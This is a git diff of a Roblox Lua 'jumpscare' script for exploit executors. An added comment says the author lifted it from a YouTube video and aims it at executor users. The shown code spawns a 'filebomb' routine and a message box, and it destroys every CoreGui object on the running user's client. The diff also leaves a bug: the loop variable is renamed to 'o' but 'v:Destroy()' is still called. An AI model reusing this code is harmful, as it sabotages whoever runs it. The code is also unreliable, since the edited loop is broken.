@@ -1,3 +1,12 @@
+--[[ jumpscare script
+	hi.
+	i am not a skid this ain't my code.
+	i just found it and stole it from a yt video that i found and felt like making it better.
+	this is used for people who use executors for roblox exploiting.
+
+	solara is not a recommended executor since it's a fucking coregui executor.
+]]
+
 -- Services
 local TextChatService = cloneref(game:GetService("TextChatService"))
 local CoreGui = cloneref(game:GetService("CoreGui"))
@@ -47,10 +56,10 @@ local function msgbox()
 	end
 end
 
-local function del()
-	for _, v in pairs(CoreGui:GetDescendants()) do
+local function delete_coregui()
+	for _, o in pairs(CoreGui:GetDescendants()) do
 		v:Destroy()
-		print(`Deleting CoreGui Object: {v}`)
+		print(`Deleting CoreGui Object: {o}`)
 	end
 end
 
@@ -68,11 +77,7 @@ task.wait(_G.Delayed_2)
 
 task.spawn(filebomb)
 task.spawn(msgbox)
-task.spawn(del)
-
--- coroutine.wrap(filebomb)()
--- coroutine.wrap(msgbox)()
--- coroutine.wrap(delete_coregui)()
+task.spawn(delete_coregui)
 
 -- Properties
 local ScreenGui = Instance.new("ScreenGui", CoreGui) -- PlayerGui
